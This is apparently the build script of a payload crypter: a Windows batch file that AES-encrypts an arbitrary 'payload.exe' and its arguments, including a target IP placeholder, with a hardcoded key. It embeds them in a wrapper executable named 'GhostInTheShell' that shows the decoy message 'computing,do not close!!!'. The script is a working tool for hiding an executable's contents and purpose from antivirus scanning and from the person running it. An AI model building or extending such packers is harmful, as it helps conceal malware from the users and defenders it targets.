@echo off

cd %~dp0

set OUT_DIR=%2


::changed you target exe here
set PAYLOAD=payload.exe
set ENCRYPTED_PAYLOAD=payload.dat
set PAYLOAD_ARGUMENTS=--name abc -ip {IP}
set AES_KEY=JustDoIt
set SCREEN_TEXT=computing,do not close!!!\n
::false|true
set SHOW_STDIO=true
set APP_NAME=GhostInTheShell


set COPY=copy /y 
set XCOPY=xcopy /a /y /i /c
set DEL=del /f /q

if "%1"=="PreCompile" (goto PreCompile) else goto PostCompile

:PreCompile

echo PreCompile

cd %OUT_DIR%

echo encrypt payload "%PAYLOAD%" to "%ENCRYPTED_PAYLOAD%"
CryptoTool.exe -k "%AES_KEY%" -e -f "%~dp0%PAYLOAD%" -o "%~dp0%ENCRYPTED_PAYLOAD%"

set ENCRYPT_ARGS_CMD=CryptoTool.exe -k "%AES_KEY%" -e -s "%PAYLOAD_ARGUMENTS%"
echo %ENCRYPT_ARGS_CMD%
for /F %%i in ('%ENCRYPT_ARGS_CMD%') do (set ENCRYPTED_PAYLOAD_ARGS=%%i)

echo encrypt arguments: "%ENCRYPTED_PAYLOAD_ARGS%"

cd %~dp0
echo make new config file
%COPY% Config.h Config.h.tmp
echo #pragma once > Config.h
echo #define ENCRYPTED_PAYLOAD "%ENCRYPTED_PAYLOAD%" >> Config.h
echo #define ENCRYPTED_PAYLOAD_ARGS "%ENCRYPTED_PAYLOAD_ARGS%" >> Config.h 
echo #define AES_KEY "%AES_KEY%" >> Config.h
echo #define SHOW_STDIO %SHOW_STDIO%>> Config.h
echo #define SCREEN_TEXT "%SCREEN_TEXT%" >> Config.h
exit

:PostCompile

echo PostCompile

%COPY% Config.h.tmp Config.h
%DEL% Config.h.tmp

set BIN_DIR=%OUT_DIR%%APP_NAME%\
mkdir %BIN_DIR%
%COPY% %OUT_DIR%AppShell.exe %BIN_DIR%%APP_NAME%.exe
%XCOPY% %OUT_DIR%libssl-1_1-x64.dll %BIN_DIR%
%XCOPY% %OUT_DIR%libcrypto-1_1-x64.dll %BIN_DIR%
%XCOPY% %ENCRYPTED_PAYLOAD% %BIN_DIR%



